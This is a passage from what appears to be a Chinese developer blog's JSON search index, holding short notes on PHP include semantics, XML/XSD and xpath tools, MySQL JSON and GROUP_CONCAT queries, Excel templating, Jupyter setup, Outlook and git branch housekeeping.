\"b\";\nexit;\n?>\n```\n\n(executing a.php:) will echo \"b\".\n\n** 小心 global namespace **\n\na.php\n\n```php\n<?php\ninclude 'b.php';\n\nfoo();\n?>\n```\n\nb.php\n\n```php\n<?php\nreturn;\n\nfunction foo() {\n     echo 'foo';\n}\n?>\n```\n\nExecuting a.php will output \"foo\".\n\n### include 和 return\n\n[PHP: include - Manual](https://www.php.net/manual/zh/function.include.php)\n\n```php\nreturn.php\n<?php\n\n$var = 'PHP';\n\nreturn $var;\n\n?>\n```\n\nnoreturn.php\n\n```php\n<?php\n\n$var = 'PHP';\n\n?>\n```\n\ntestreturns.php\n\n```php\n<?php\n\n$foo = include 'return.php';\n\necho $foo; // prints 'PHP'\n\n$bar = include 'noreturn.php';\n\necho $bar; // prints 1\n\n?>\n```\n\n> \\$bar 的值為 1 是因為 include 成功運行了。注意以上例子中的區別。第一個在被包含的文件中用了 return 而另一個沒有。如果文件不能被包含，則返回 FALSE 並發出一個 E_WARNING 警告。\n\n> 如果在包含文件中定義有函數，這些函數不管是在 return 之前還是之後定義的，都可以獨立在主文件中使用。如果文件被包含兩次，PHP 5 發出致命錯誤因為函數已經被定義，但是 PHP 4 不會對在 return 之後定義的函數報錯。推薦使用 include_once 而不是檢查文件是否已包含並在包含文件中有條件返回。\n\n### include_once 和 return\n\n[PHP: include_once - Manual](https://www.php.net/manual/en/function.include-once.php)\n其實看範例很快就可以懂了\n載入進去預設會為 True，假如文件有`return value`，include_once 就會回傳\n但`include_once`第二次不會回傳東西\n\n```php\nconfig.php\n<?php\nreturn array(\"test\">1);\n```\n\n---\n\n//first\n\n```php\n$config = include_once(\"config.php\");\nvar_dump($config);\n\n$config = include_once(\"config.php\");\nvar_dump($config);\n```\n\n---\n\noutput will be\narray(\n\"test\"=>1,\n)\n\nnothing\n\n### 小記 include 和 require 差別\n\n> require 和 include 的不同 require 適合用來引入靜態的內容，而 include 則適合用來引入動態的程式碼。\n> include 在執行時，如果 include 進來的檔案發生錯誤的話，會顯示警告，不會立刻停止；\n> 而 require 則是會顯示錯誤，立刻終止程式，不再往下執行。\n> include 可以用在迴圈；require 不行。\n\n參考來源: [Syun: [PHP]include 與 require 的差別](http://syunguo.blogspot.com/2013/04/phpinclude-require.html)\n","tags":["return"],"categories":["PHP"]},{"title":"XSD 看 XML 結構一些工具","url":"%2Fblog%2F2019%2F09%2F07%2FXSD-%E7%9C%8B-XML-%E7%B5%90%E6%A7%8B%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%2F","content":"\n最近看 XSD 檔案，覺得這個東西有轉成圖片來看\n不過找了一些工具試試\n\n<!--more-->\n\n## XSD 實用工具\n\n### XSDVI\n\n這個可以轉成圖\n目前不方便測試這個\n功能好像還不錯!!\n\nhttp://xsdvi.sourceforge.net/ipo.svg\n\n\nhttp://sourceforge.net/projects/xsdvi/\n\ngit clone 下來\nant 完會在dist\n在依照範例執行可以產生 SVG\n還滿簡單的\n\n### jEdit XML Plugin\n\n沒測試\n\n### CAM editor \n\n[CAM Editor](http://camprocessor.sourceforge.net/wiki/index.php/Main_Page)\n\n我 linux 打不開就沒測試了\n\n### XSD Diagram\n\n[Dgis XSD Diagram](http://regis.cosnier.free.fr/?page=XSDDiagram)\n\n不知道為什麼我的 XSD 不能用在上面...\n\n### Eclipse XSD Editor \n\n可以簡單看 XML 工具\n\nPS安裝小記:\n不知道為什麼我用 `apt` 安裝不能打開\n使用 `snap` 安裝 eclipse 就正常...\n\n這個能看 XML 格式，算滿中規中矩，介面不太差\n\n參考來源:\n[XML Schema editors - Wikipedia](https://en.wikipedia.org/wiki/XML_Schema_editors)\n\n### QXmlEdit\n[最簡單實用的QXmlEdit，程式設計師你用了嗎？ - 每日頭條](https://kknews.cc/zh-tw/tech/gqqj39m.html)\n[QXmlEdit - simple XML editor](http://qxmledit.org/)\n\n這個終於可以開啟我的 XML 感動\n功能還算滿不錯\n\n不知道官網抓下來檔案不能開\n所以我用 `snap` 安裝\n\n```bash\nsudo apt install snapd\n# [Install qxmledit for Linux using the Snap Store | Snapcraft](https://snapcraft.io/qxmledit)\nsudo snap install qxmledit\n# 路徑在 /snap/bin/qxmledit\n./snap/bin/qxmledit\n```\n\n\n### Visual Studio 2019\n\n聽說 2019 有圖示介面可以看\n但我不想裝大怪獸...\n\n參考來源:\n- [xsd - How to visualize an XML schema? - Stack Overflow](https://stackoverflow.com/questions/2486758/how-to-visualize-an-xml-schema)\n- [XML Schema editors - Wikipedia](https://en.wikipedia.org/wiki/XML_Schema_editors)\n\n## XSD 教學\n\n[XML：Schema、三种编写Schema的方式 - 熊诗言的博客 - CSDN博客](https://blog.csdn.net/xxssyyyyssxx/article/details/50372503)\n[DTD與XSD的區別 - IT閱讀](https://www.itread01.com/content/1548934564.html)\n\n\n","tags":["xsd"],"categories":["XML"]},{"title":"XML 好用的查詢工具","url":"%2Fblog%2F2019%2F09%2F05%2FXML-%E5%A5%BD%E7%94%A8%E7%9A%84%E6%9F%A5%E8%A9%A2%E5%B7%A5%E5%85%B7%2F","content":"\n最近做 Digital Data Exchange 介接資料\nXML 平常是會用，有知道一些 Library 可以解析裡面資料\n但進階的 xpath 平常沒有什麼用到\n就找找看有什麼實用工具\n讓未來 debug 有更快的方法\n\n<!--more-->\n\n首先 Digital Data Exchange 是一個規則(XML)\n因為可能會用到 xpath 在想有什麼好工具可以用?\n\n## XSD\n\n首先，先講解什麼是 XSD(XML Schema D)\n我以前這篇文章有提過[驗證快速檢查JSON方法 | 程式狂想筆記](https://malagege.github.io/blog/2018/10/20/%E9%A9%97%E8%AD%89%E5%BF%AB%E9%80%9F%E6%AA%A2%E6%9F%A5JSON%E6%96%B9%E6%B3%95/)\n\n[使用 XSD 為 XML 客製 Intellisense 輸入選單 - Yowko's Notes](https://blog.yowko.com/xml-intellisense-xsd/)\n[XSDVi](http://xsdvi.sourceforge.net/)\n[Dgis XSD Diagram](http://regis.cosnier.free.fr/?page=XSDDiagram)\n\n但我還沒找到好用的工具\n\n## bash 指令\n\n### xmllint\n\n\n```bash\n# 安裝\nsudo apt install libxml2-utils\n# 使用 xpath\nxmllint --xpath \"//*[local-name()='product_version']/*[local-name()='name']/text()\" file.xml\n```\n\n不過不知到為什麼公司有裝的工具不能用\n可能版本太舊?\n\n**2019-09-10**\n有找到方法\n[xmllint unknown option '--xpath' - Stack Overflow](https://stackoverflow.com/questions/11975862/xmllint-unknown-option-xpath)\n\n結果查東西還是要用人工去掃...\n```bash\nxmllint --shell xxxx.xml << EOF\n'//xxx'\nEOF\n\n\n\nxmllint --shell xxxx.xml <<<'xpath //xxx'\n\n\nfor f in `find . -type f  -name '*.xml'`\ndo\nxmllint --shell $f <<<'xpath //oooo/' \ndone\n\n\nfor f in `find . -type f  -name '*.xml'`\ndo\necho $f\nxmllint --shell $f <<<'xpath //oooo[.!=\"aa\" and .!=\"bbb\" and .!=\"ccc\"]/text()'\ndone\n\nfor f in *.xml\ndo\necho $f\ndone\n\nfor f in `find . -type f  -name '*.xml'`\ndo\necho $f\nxmllint --shell $f <<<'xpath //xxx[.=\"123456\"]/text()'\ndone\n\n```\n\n## xpath\n\n```bash\n# 安裝\nsudo apt install libxml-xpath-perl\n# xpath\nxpath -e '//book/name/text()'  sample.xml\n```\n\n## xml2\n\n```bash\n# 安裝\nsudo apt install xml2\ncat sample.xml |xml2\n```\n\n詳細可看: [Shell解析处理XML方法汇总](https://blog.mythsman.com/post/5d2b5ebf25601931a5f8d885/) {% asset_link web1.png 備份圖 %}\n\n其他參考\n* [如何使用XMLLINT和BASH解析XML文件中的命名空间 - 智库101 - 一个基于CC版权的问答分享平台](http://www.kbase101.com/question/25515.html)\n* [/bin/bash: xmllint: 未找到命令 - hailushijie的专栏 - CSDN博客](https://blog.csdn.net/droyon/article/details/8655517)\n* [Shell解析处理XML方法汇总](https://blog.mythsman.com/post/5d2b5ebf25601931a5f8d885/)\n* [XPath详解,总结 - 钱途无梁 - 博客园](https://www.cnblogs.com/qiantuwuliang/archive/2009/05/17/1458684.html)\n* [xpath注入详解 - 渗透测试中心 - 博客园](https://www.cnblogs.com/backlion/p/8554749.html)\n\n\n## 實用 vscode 套件\n\n[XML - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=redhat.vscode-xml)\n記得要安裝 Java\n要設定 home 路徑\n[XML Tools - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=DotJoshJohnson.xml)\n可查 xpath ，算是滿方便可以查詢套件!!\n\n\n## 相關 xpath 一些教學網站\n\n因為還沒有很熟悉，之後開一篇做 xpath 筆記\nXSD 可能也會記錄怎麼看，感覺認真看 XML 也是個大坑!!!\n\n* [XPath详解,总结 - 钱途无梁 - 博客园](https://www.cnblogs.com/qiantuwuliang/archive/2009/05/17/1458684.html)\n* [xpath注入详解 - 渗透测试中心 - 博客园](https://www.cnblogs.com/backlion/p/8554749.html)\n* [Nightwatch101 #6：使用 Xpath 定位網頁元素 | Summer。桑莫。夏天](https://cythilya.github.io/2017/12/16/nightwatch-xpath/)\n\n**2019-10-02**\n\nxpath 可以寫這麼複雜\n但要記得`[]`比對資料要帶`\"`\n```xml\nDataReference[text()=//ShowArtist[@SequenceNumber=\"1\"]/ArtistDataReference]\n```\n\n[XPath online real-time tester, evaluator and generator for XML & HTML](http://xpather.com/)\n[爬虫进阶开发——xpath选择器常见用法 · phpspider开发文档](https://doc.phpspider.org/xpath.html)\n[在 xml.value 中, XPath中使用 text() 函数的重要性 | 陈鹏个人博客](http://blog.chenpeng.info/html/2375)\n\nrelative path ./\n/\n//xxxx[xxxx[xxxx=sss]]=//xxxx[xxxx]/\n\ndomxpath\n\n```php\n<?php\n$xpath = new \\DOMXpath($this->xml); // 這邊 xml 是放 DOMDocument\n$query=\"xxxx/oooo[1]/vvvvv/ddd\"; // relative ??\n// 目前看到官網也有類似相關範例\n// 我的認知 Xpath 前面都要有 // or /\n// 這邊應該都是從 root 開始\n\n\n$node = $xpath->query($query)->item(0);\n$node = !empty($node) ? trim($node->nodeValue) : '' ;\n\nforeach ($dates as $key => $a_node) {\n    foreach ($a_node->childNodes as $value) {\n        if ($value->nodeName == 'xxxx') {\n\n...\n\n```\n\n這邊注意 SimpleXML 跟 domxpath 完全沒什麼關係\n我目前看法這些應該是兩個不同 Library\n所以用法也不太一樣\ndomxpath 回傳東西很像 Javascript 的 Node\n記得 domxpath 抓\n\n\n看起來很不錯套件[servo-php/fluidxml: FluidXML, the PHP library for manipulating XML with a concise and fluent API.](https://github.com/servo-php/fluidxml)\n\n","tags":["vscode"],"categories":["XML"]},{"title":"MySQL / MariaDB 查詢 JSON 資料小記","url":"%2Fblog%2F2019%2F09%2F03%2FMySQL-MariaDB-%E6%9F%A5%E8%A9%A2-JSON-%E8%B3%87%E6%96%99%E5%B0%8F%E8%A8%98%2F","content":"\n最近剛好要撈出某一台 DB 特別的值\n但那個欄位都是 JSON 格式\n剛好那台 DB 是 MySQL 5.7.x\n可以用 JSON，就趁個這個機會做筆記\n\n\n<!--more-->\n\n\n```SQL\n-- example\nSELECT log->'$.uid' AS uid FROM xxx where log->'$.uid' IN (\n    xxxx\n)and time BETWEEN '2019-07-09 00:00:00' and '2019-07-09 23:59:59'\n\n-- 暫時撈資料跑報表\nSELECT type,pl_id,count(1)\nFROM (\nSELECT log->'$.uid' as uid,'2' as type,log->'$.playtrackId' AS pl_id, time  FROM log_table where log->'$.uid' = 'xxxxxx' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59'\nUNION ALL\nSELECT log->'$.uid' AS uid,'2' as type,log->'$.playtrackId' AS pl_id, time  FROM log_table where log->'$.uid' = 'oooooo' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59'\nUNION ALL\nSELECT log->'$.uid' AS uid,'2' as type,log->'$.playtrackId' AS pl_id, time  FROM log_table where log->'$.uid' = 'aaaaaa' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59'\nUNION ALL\nSELECT log->'$.uid' AS uid,'2' as type,log->'$.playtrackId' AS pl_id, time  FROM log_table where log->'$.uid' = 'zzzzzz' and time between '2019-07-09 00:00:00' and '2019-07-09 23:59:59'\n)  aa\ngroup by type,pl_id\n```\n\n最後發現 JSON 字串前後會帶`\"`\n可以用`JSON_UNQUOTE`\n\nMariaDB 也可以使用，不過我目前沒有用到\n下方聯結有更詳細介紹\n[MySQL 5.7 新特性 JSON 的创建，插入，查询，更新](http://www.lnmp.cn/mysql-57-new-features-json.html) {% asset_link web1.png 備份圖 %}\n[MariaDB 10.0.X中，动态列支持 JSON 格式来获取数据。 -贺春旸的技术博客-51CTO博客](https://blog.51cto.com/hcymysql/1694181) {% asset_link web2.png 備份圖 %}\n\n之後還有用到實用的方法再補充\n\n","tags":["json"],"categories":["MySQL"]},{"title":"php-excel-templator 用範本(template)快速產生Excel方法","url":"%2Fblog%2F2019%2F09%2F03%2Fphp-excel-templator-%E7%94%A8%E7%AF%84%E6%9C%AC-template-%E5%BF%AB%E9%80%9F%E7%94%A2%E7%94%9FExcel%E6%96%B9%E6%B3%95%2F","content":"\n最近在工作上常常做報表(Excel)\n常常用程式控制 Excel 格式\n非常不方便\n最近在找找有沒有用 template 好用工具\n\n<!--more-->\n\n之前有找這些東西，但沒有比較好用。最近看到`php-excel-templator`這個，完整性感覺還滿高的。\n\n## php-excel-templator\n\n[alhimik1986/php-excel-templator: PHP Spreadsheet extension to the export excel file from excel template](https://github.com/alhimik1986/php-excel-templator)\n\n可以從 array 去塞一維、二維陣列\n>     {var_name} - for string values\n>    [var_name] - for one-dimensional arrays\n>    [[var_name]] - for two-dimensional arrays\n\n雖然這個沒有從 Excel 塞`key`進去，需要照 array 每個值的位子去塞\n但還有對相關欄位做背景顏色設定\n這部份可相對完整!!\n裡面還有範例，可以算是非常好上手\n\n\n## 其他程式\n\n[optilude/xlsx-template: A NodeJS module to generate Excel files in .xlsx format from a template created with Excel itself](https://github.com/optilude/xlsx-template)\n這個星星數也滿高的，有針對 key 去塞\n裡面也有範例檔案，但`key`沒對到程式就會出現錯誤\n\n[ivahaev/go-xlsx-templater: Simple xlsx template based document generator](https://github.com/ivahaev/go-xlsx-templater)\n[透過MAATWEBSITE/LARAVEL-EXCEL匯出資料-EXPORT - Dustin's murmur](https://dustinhsiao21.com/2018/08/15/maatwebsite-laravel-excel-export/)\n\n\n## 小記\n\n有網路上爬到 `docx` 其實是一個壓縮檔，可以直接用 zip 打開，看裡面的檔案\n難怪之前有一篇有用[Java操作POI修改報表sample檔發生信任活頁簿問題 | 程式狂想筆記](https://malagege.github.io/blog/2018/09/18/Java%E6%93%8D%E4%BD%9CPOI%E4%BF%AE%E6%94%B9%E5%A0%B1%E8%A1%A8sample%E6%AA%94%E7%99%BC%E7%94%9F%E4%BF%A1%E4%BB%BB%E6%B4%BB%E9%A0%81%E7%B0%BF%E5%95%8F%E9%A1%8C/)去看問題\n\n\n這當中有\n[Open XML SDK and Excel generation from template | The ASP.NET Forums](https://forums.asp.net/t/2119763.aspx?Open+XML+SDK+and+Excel+generation+from+template)\n\n\n之前有寫過類似文章\n[Word,Excel的相關template套件小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/05/05/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/)\n\n\n\n[語言的大雜燴: [NuGet]用OpenXml在docx中套版列印 - 基本型](http://lhzyaminabe.blogspot.com/2016/01/openxmldocx.html)\n[【雛型】Docx套版列印功能試作-黑暗執行緒](https://blog.darkthread.net/blog/docx-templating/)\n\n\n**2019-09-08**\n發現[shadz3rg/PHPStamp: The XSL-way templating library for MS Office Word DOCX documents.](https://github.com/shadz3rg/PHPStamp)這個感覺不錯用套件\n之前有寫過這篇[Word,Excel的相關template套件小記 | 程式狂想筆記](https://malagege.github.io/blog/2019/05/05/Word-Excel%E7%9A%84%E7%9B%B8%E9%97%9Ctemplate%E5%A5%97%E4%BB%B6%E5%B0%8F%E8%A8%98/)\n","tags":["template"],"categories":["PHP"]},{"title":"GROUP_CONCAT 和 CONCAT_WS 多個橫欄和縱欄組在一起方法","url":"%2Fblog%2F2019%2F09%2F02%2Fgroup-cancat-%E5%92%8C-concat-ws-%E5%A4%9A%E5%80%8B%E6%A9%AB%E6%AC%84%E5%92%8C%E7%B8%B1%E6%AC%84%E7%B5%84%E5%9C%A8%E4%B8%80%E8%B5%B7%E6%96%B9%E6%B3%95%2F","content":"\n之前有使用 group_concat ，但沒有特別做筆記\n今天剛好查報表資料，就特別來筆記\n\n<!--more-->\n\n\n```sql\nSELECT oa.id,\n       GROUP_CONCAT(if(a.xxx_group = 0 , NULL,a.xxx_group)) AS xxx_group,\n       CONCAT_WS(',',IF(f.a1,'a1',NULL),IF(f.a2,'a2',NULL),IF(f.a3,'a3',NULL)) AS 'a...',\n       IF(a.xxx > ''\n          OR a.bbb > '','Y','N') AS 'oo',\n       IF(a.cc > '' ,'Y','N') AS 'cc'\nFROM a\nLEFT JOIN b ON b = a.id\nLEFT JOIN f ON f.xxx_id = a.id\n```\n\n## GROUP_CONCAT\n\n當初在 MySQL 看到這個函數有點大開眼界\n因為 DB2 沒有看到類似的 function\n但後來版本也有類似功能 [DB2 comma separated output - Stack Overflow](https://stackoverflow.com/questions/7188542/db2-comma-separated-output)\n\n簡單說明一下 GROUP_CONCAT \n當初看到這個函數想說他能不能推回去(多列)\n但是這不可能做到 [MySQL :: MySQL 8.0 Reference Manual :: 12.20.1 Aggregate (GROUP BY) Function Descriptions](https://dev.mysql.com/doc/refman/8.0/en/group-by-functions.html)\n看到 GROUP_CONCAT 歸類到 GROUP FUNCTION 我覺得不太可能...\n\n```\nGROUP_CONCAT([DISTINCT] expr [,expr ...]\n[ORDER BY {unsigned_integer | col_name | expr}\n[ASC | DESC] [,col_name ...]]\n[SEPARATOR str_val])\n```\n使用搭配記得要加 GROUP BY\n\n但不知道有兩個欄位做 GROUP_CONCAT 不知道會不會有問題\n改天再實驗\n\n## CONCAT_WS\n\n之前看到這個函示不知道這個用在哪裡\n剛好資料要抓多欄資料合併成一欄...\n我想到用`CONCAT_WS`\n我裡面包個IF 做 null判斷是預防抓到空字串轉`null`動作\n轉null後就不會串到`,`裡面\n\n\n\n","tags":["mysql"],"categories":["MySQL"]},{"title":"兩個資料比對方法","url":"%2Fblog%2F2019%2F09%2F02%2F%E5%85%A9%E5%80%8B%E8%B3%87%E6%96%99%E6%AF%94%E5%B0%8D%E6%96%B9%E6%B3%95%2F","content":"\n最近做兩個資料比較\n一直常常做這件事情\n不知道有沒有比較發便的做法\n\n<!--more-->\n\n先說說我常用的方法\n\n## Visual Studio Code 比較方法\n\n首先把一列資料貼在 Sublime F9 做排序(Excel也可以XD)\n在貼到 Visual Studio Code 做 diff 動作\n這方法快速簡單，但只能比對一行資料\n\n## Excel 大法\n\nExcel 我不熟，有爬到一些方法\n\n[【Excel】比對雙方資料的同異處（IFERROR、VLOOKUP、IF） @ ＊YC的筆記鋪 :: 痞客邦 ::](http://lyc017.pixnet.net/blog/post/184627407-%E3%80%90excel%E3%80%91%E6%AF%94%E5%B0%8D%E9%9B%99%E6%96%B9%E8%B3%87%E6%96%99%E7%9A%84%E5%90%8C%E7%95%B0%E8%99%95%EF%BC%88iferror%E3%80%81vlooku)\n[Excel應用 如何快速比對兩列數據相同點和不同點 每個人都會用到 - 每日頭條](https://kknews.cc/zh-tw/education/xve4k38.html)\n[兩份 excel 文件比對 - 文書處理 - 電腦討論區 - Mobile01](https://www.mobile01.com/topicdetail.php?f=511&t=2956123&p=1)\n[Excel內兩個sheet資料內容差異比對.. - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天](https://ithelp.ithome.com.tw/questions/10186750)\n\n## pandas\n\n一樣不熟，有空來用用\n\n[python - Comparing two dataframes and getting the differences - Stack Overflow](https://stackoverflow.com/questions/20225110/comparing-two-dataframes-and-getting-the-differences)\n[Python Pandas - Find difference between two data frames - Stack Overflow](https://stackoverflow.com/questions/48647534/python-pandas-find-difference-between-two-data-frames)\n[grades1 ](https://ask.wellsr.com/)\n\n### excel-diff\n\n[Diff Two Excel Files with Python | Matthew Kudija](https://matthewkudija.com/blog/2018/07/21/excel-diff/)\n[blog/content/downloads/code/excel-diff at master · mkudija/blog](https://github.com/mkudija/blog/tree/master/content/downloads/code/excel-diff)\n\n爬到這篇，有現成範例程式\n剛好前幾天有安裝 Jupyter Notebook (Anaconda3)\n打開Notebook 裡面的 Terminal\n直接執行就可以用，相對 excel-diff-3 跟 excel-diff-2 結果是相同\n**這個唯一需要注意 UID 需要一致 也必須是數字**\nexcel-diff-1 新增/移除資料不會抓到，但是不需要指定 UID 樣子\n這個好用工具還是有限制的\n\n\n有發現好的方法持續補充","tags":["xlsx"],"categories":["實用工具"]},{"title":"JS 原生方法做到 jQuery one 事件","url":"%2Fblog%2F2019%2F09%2F01%2FJS-%E5%8E%9F%E7%94%9F%E6%96%B9%E6%B3%95%E5%81%9A%E5%88%B0-jQuery-one-%E4%BA%8B%E4%BB%B6%2F","content":"\n今天想用 jQuery one 監聽事件\n想找原生簡單使用方法\n原本想 Event 直接取消監聽\n但還是有爬到比較簡單的做法，簡單紀錄一下\n\n<!--more-->\n\n```js\ndocument.querySelector('#click').addEventListener('click', function(e){\n    if(e.currentTarget.dataset.triggered) return;\n    e.currentTarget.dataset.triggered = true;\n    alert('clicked');\n})\n```\n```html\n<button id=\"click\">Click me</button>\n```\n\n參考來源:[javascript - JS equivalent for jQuery one() - Stack Overflow](https://stackoverflow.com/questions/36312249/js-equivalent-for-jquery-one)","tags":["javascript"],"categories":["JavaScript"]},{"title":"Hey 壓力測試工具","url":"%2Fblog%2F2019%2F08%2F30%2FHey-%E5%A3%93%E5%8A%9B%E6%B8%AC%E8%A9%A6%E5%B7%A5%E5%85%B7%2F","content":"\n\n還在整理中...\n\n\n<!--more-->\n\n簡單說一下 QPS = request / sec\n\n測試高併發的時候可以使用這個\n\n[谈谈并发的一些基础概念 | BoxCore](https://boxcore.github.io/2017/11/22/sa/talk-about-tps-and-qps.html)\n\n[hey壓力測試工具介紹 - V218筆記](http://www.v218.com/a126)\n\n[谈谈并发的一些基础概念 | BoxCore](https://boxcore.github.io/2017/11/22/sa/talk-about-tps-and-qps.html)\n\n[QPS、PV和需要部署机器数量计算公式 | Web开发笔记](https://www.magentonotes.com/what-is-qps.html)\n\n\n","tags":["jmeter"],"categories":["實用工具"]},{"title":"Jupyter Notebook 使用初體驗","url":"%2Fblog%2F2019%2F08%2F30%2FJupyter-Notebook-%E4%BD%BF%E7%94%A8%E5%88%9D%E9%AB%94%E9%A9%97%2F","content":"\n最近看到有人拿 Jupyter 做筆記\n之前都不知清楚有什麼作用\n不過有看到有人拿來做一些程式筆記\n裡面也可以寫 Markdown 文件\n今天就來安裝玩玩\n\n<!--more-->\n\n## anaconda\n\n裡面包含 Jupyter Notebook ,pandas....\n所以我選擇安裝這個\n快速完成環境\n\nPS: Apache Zeppelin 也有類似的功能\n## 安裝套件\n\n\n[jupyter notebook 可以做哪些事情？ - 知乎](https://www.zhihu.com/question/46309360)\n\n### Snippets\n\n因為 python 不熟，安裝這個可以快速使用\n\n#### 安裝方法\n\n```bash\ngit clone git://github.com/moble/jupyter_boilerplate\njupyter nbextension install jupyter_boilerplate\njupyter nbextension enable jupyter_boilerplate/main\n```\n\n\n### 自動補字\n\n#### 安裝方法\n\n**安裝前記得要先把 jupyter 關掉!!!!**\n> 安裝\n> 如果之前安裝過顯示目錄功能的話，這一步驟可以跳過。\n> pip install jupyter_contrib_nbextensions\n> 配置\n> 安裝完之後需要配置 nbextension，注意配置的時候要確保已關閉 Jupyter Notebook：\n> jupyter contrib nbextension install --user --skip-running-check\n> 啟動 Jupyter Notebook，勾選設置\n> 上面兩個步驟都沒報錯後，啟動 Jupyter Notebook，上面選項欄會出現 Nbextensions 的選項\n> 作者：caoqi95\n> 链接：https://www.jianshu.com/p/0ab80f63af8a\n> 来源：简书\n> 简书著作权归作者所有，任何形式的转载都请联系作者获得授权并注明出处。\n\n\n[Jupyter Notebook 添加代码自动补全功能 - 简书](https://www.jianshu.com/p/0ab80f63af8a)\n\n\n\n\n## csv 轉 xlsx\n\npandas 可以方便做很多東西\n例如資料轉換格式\n真的非常方便許多\n\n```python\nfrom __future__ import print_function, division\nimport pandas as pd\n\nbp_data = pd.read_csv(\"FL_insurance_sample.csv\")\n\nbp_data.to_excel('test.xlsx',index=False)\n```\n\n{% asset_link csv轉xlsx.ipynb ipynb檔案 %}\n\n參考範例:[【python】pandas库pd.to_excel操作写入excel文件参数整理与实例 - brucewong0516的博客 - CSDN博客](https://blog.csdn.net/brucewong0516/article/details/79097909)\n[Sample CSV Data – SpatialKey Support](https://support.spatialkey.com/spatialkey-sample-csv-data/)\ncsv來源從這邊來\n\n\n## pandas 一些應用\n\n可以抓取重複資料，但不知道大檔案處理速度不知道能不能負荷\n\n[pandas使用技巧【18】找到和移除重复行 - 简书](https://www.jianshu.com/p/c033f89f4750)\n[資料處理：用pandas處理大型csv檔案 - IT閱讀](https://www.itread01.com/content/1541375289.html)\n[Pandas之drop_duplicates：去除重复项 - OraYang的博客 - CSDN博客](https://blog.csdn.net/u010665216/article/details/78559091)\n[python - how to transform pandas dataframe for insertion via executemany() statement? - Stack Overflow](https://stackoverflow.com/questions/29938613/how-to-transform-pandas-dataframe-for-insertion-via-executemany-statement)\n[How to write python sql output into CSV using a dataframe - Stack Overflow](https://stackoverflow.com/questions/41650188/how-to-write-python-sql-output-into-csv-using-a-dataframe)\n[python - SQL statement for CSV files on IPython notebook - Stack Overflow](https://stackoverflow.com/questions/36431213/sql-statement-for-csv-files-on-ipython-notebook)\n[【精心解读】关于Jupyter Notebook的28个技巧 - 知乎](https://zhuanlan.zhihu.com/p/32600329)\n\n類似 SQL 應用\n[How to rewrite your SQL queries in Pandas, and more](https://medium.com/jbennetcodes/how-to-rewrite-your-sql-queries-in-pandas-and-more-149d341fc53e)\n\n\n[python 3.x - Removing duplicates between multiple large CSV files - Stack Overflow](https://stackoverflow.com/questions/51824732/removing-duplicates-between-multiple-large-csv-files)\n\n\n常常有時候會收到一些 Excel 要產生 SQL 語句\n但是看一下內建to_sql\n好像直接對csv匯入...\n可能還是需要用\n有機會應用在補充\n\n\n## 連 Oracle\n\n[在Python用cx_Oracle去操作Oracle資料庫 | Ching-Chuan Chen's Blogger](http://chingchuan-chen.github.io/posts/201607/2016-07-26-use-cx_Oracle-to-manipulate-oracle-database-in-Python.html)","tags":["jupyter"],"categories":["實用工具"]},{"title":"Outlook 複製資料夾匯出方法","url":"%2Fblog%2F2019%2F08%2F29%2FOutlook-%E8%A4%87%E8%A3%BD%E8%B3%87%E6%96%99%E5%A4%BE%E5%8C%AF%E5%87%BA%E6%96%B9%E6%B3%95%2F","content":"\n最近使用 Outlook 匯入一些規則\n但相關規則會做搬移信件到其他資料夾\n由於規則非常多，所以我需要建置一些資料夾\n想說有什麼快速方法， Google 一下好用方法\n來記錄一下非常快速方法\n\n<!--more-->\n\n> 點擊「檔案」→「資訊」頁→「清理工具」，選擇「封存」，\n> 選擇要複製的來源資料檔、目的資料檔路徑，\n> 指定封存日期早於任何一封郵件的日期，\n> 即可複製一個只有空資料夾的pst檔。\n參考: [[Outlook] 複製Outlook資料檔目錄結構](http://cic-soon.blogspot.com/2013/01/outlook-outlook.html)\n\n我用 Outlook 2010 方式可以順利完成!!\n\n[如何將文件夾結構複製到Outlook中的新的PST數據文件？](https://www.extendoffice.com/zh-TW/documents/outlook/2385-outlook-copy-folder-structure-new-pst.html)","tags":["outlook"],"categories":["實用工具"]},{"title":"Git 查看合併分支並刪除方法","url":"%2Fblog%2F2019%2F08%2F27%2FGit-%E6%9F%A5%E7%9C%8B%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF%E4%B8%A6%E5%88%AA%E9%99%A4%E6%96%B9%E6%B3%95%2F","content":"\n最近常常看哪些 branch 有做合併動作\n我都使用`gitk --all` 看合併\n但我覺得應該有很方便指令看的方法\n\n<!--more-->\n\n官方文件有詳細說明\n[Git - 分支的管理](https://git-scm.com/book/zh-tw/v1/Git-%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E7%9A%84%E7%AE%A1%E7%90%86)\n\n## git branch --merged\n\nshow 出來已經 merged 的分支\n\n\n## git branch --no-merged\n\n以此類推，list出沒合併的分支\n\n## 其他備註\n\n之前有做過[Git刪除Rmote Branch方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/05/09/Git%E5%88%AA%E9%99%A4Rmote-Branch%E6%96%B9%E6%B3%95/)\n**看來local 端的 git branch 要自己 `git branch -d xxx`**\n沒辦法自動 delete 掉\n\ngit fetch -p or git fetch –all –prune 是清除本地的remote 暫存分支\n\n\n相關連結\n[[git]如何快速清理已經合並(merged)的分支(branch) - local及remote @ Alan Tsai 的學習筆記｜An Asp .Net Mvc Web Developer Blog](https://blog.alantsai.net/posts/2019/04/faq-git-how-to-delete-merged-branches-from-remote-and-local)\n[Git 的 Merge 與 Fast-Forward - Qiita](https://qiita.com/vc7/items/6e06b0306c8a64a23263)\n[🌳🚀 CS Visualized: Useful Git Commands - DEV Community 👩‍💻👨‍💻](https://dev.to/lydiahallie/cs-visualized-useful-git-commands-37p1)","tags":["git"],"categories":["Git"]},{"title":"SQL 做時間判斷條件需要注意的事情","url":"%2Fblog%2F2019%2F08%2F27%2FSQL-%E5%81%9A%E6%99%82%E9%96%93%E5%88%A4%E6%96%B7%E6%A2%9D%E4%BB%B6%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n好幾次採到 SQL 